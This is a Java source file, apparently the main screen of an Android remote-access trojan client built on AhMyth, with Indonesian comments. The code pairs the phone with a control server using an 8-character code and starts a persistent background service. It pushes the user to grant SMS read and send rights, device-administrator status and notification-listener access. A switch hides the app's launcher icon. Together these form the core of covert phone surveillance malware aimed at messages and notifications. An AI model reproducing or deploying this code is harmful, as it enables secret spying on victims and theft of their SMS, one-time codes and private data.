package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.Toast;

public class MainActivity extends Activity {

    DevicePolicyManager devicePolicyManager;
    ComponentName componentName;
    SharedPreferences sharedPreferences;

    private EditText editPairingCode;
    private Button btnPair;
    private Button btnListener;
    private Switch switchHideIcon;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize UI
        editPairingCode = findViewById(R.id.pairingCode);
        btnPair = findViewById(R.id.pairingBtn);
        btnListener = findViewById(R.id.listenerBtn);
        switchHideIcon = findViewById(R.id.switch1);

        componentName = new ComponentName(this, AdminReceiver.class);
        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);

        // ========================================
        // CEK APAKAH SUDAH PAIRED
        // ========================================
        if (IOSocket.getInstance().isPaired(this)) {
            String savedCode = IOSocket.getInstance().getSavedPairingCode(this);
            editPairingCode.setText("✓ Paired: " + savedCode);
            editPairingCode.setEnabled(false);
            btnPair.setText("PAIRED");
            btnPair.setEnabled(false);
            btnPair.setBackgroundColor(0xFF4CAF50); // Green
        }

        // ========================================
        // TOMBOL PAIRING
        // ========================================
        btnPair.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String pairingCode = editPairingCode.getText().toString().trim().toUpperCase();

                // Validasi input
                if (TextUtils.isEmpty(pairingCode)) {
                    Toast.makeText(MainActivity.this, "Masukkan pairing code!", Toast.LENGTH_SHORT).show();
                    return;
                }

                if (pairingCode.length() != 8) {
                    Toast.makeText(MainActivity.this, "Pairing code harus 8 karakter!", Toast.LENGTH_SHORT).show();
                    return;
                }

                // Inisialisasi socket dengan pairing code
                IOSocket.getInstance().initSocket(MainActivity.this, pairingCode);

                // Start koneksi
                ConnectionManager.startAsync(MainActivity.this);

                // Update UI
                editPairingCode.setEnabled(false);
                btnPair.setText("CONNECTING...");
                btnPair.setEnabled(false);

                Toast.makeText(MainActivity.this, "Menghubungkan ke server...", Toast.LENGTH_SHORT).show();

                // Auto close after 2 seconds
                v.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        finish();
                    }
                }, 2000);
            }
        });

        // ========================================
        // TOMBOL NOTIFICATION SETTINGS
        // ========================================
        btnListener.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
            }
        });

        // Request permissions & admin
        requestAllPermissions();
        requestDeviceAdmin();
        checkNotificationAccess();
        setupHideIconSwitch();

        // Start service
        MainService.startService(this);
        Intent serviceIntent = new Intent(this, MainService.class);
        ContextCompat.startForegroundService(this, serviceIntent);
    }

    private void requestAllPermissions() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {

            Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            mIntent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(mIntent);
            Toast.makeText(this, "Berikan semua izin!", Toast.LENGTH_LONG).show();
        }
    }

    private void requestDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    getString(R.string.device_admin_explanation));
            startActivity(intent);
        }
    }

    private void checkNotificationAccess() {
        if (!NotificationManager.isNotificationServiceEnabled(this)) {
            NotificationManager.openNotificationSettings(this);
            Toast.makeText(this, "Aktifkan Notification Access!", Toast.LENGTH_LONG).show();
        }
    }

    private void setupHideIconSwitch() {
        if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            switchHideIcon.setVisibility(View.VISIBLE);

            final SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

            switchHideIcon.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                @Override
                public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                    appSettingEditor.putBoolean("hidden_status", isChecked);
                    appSettingEditor.commit();

                    if (isChecked) {
                        hideIcon();
                    }
                }
            });

            boolean iconHiddenStatus = sharedPreferences.getBoolean("hidden_status", false);
            switchHideIcon.setChecked(iconHiddenStatus);

            if (iconHiddenStatus) {
                hideIcon();
            }
        } else {
            switchHideIcon.setVisibility(View.GONE);
        }
    }

    private void hideIcon() {
        getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    public void openGooglePlay(View view) {
        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW,
                Uri.parse("https://play.google.com/store/apps"));
        startActivity(GoogleIntent);
    }
}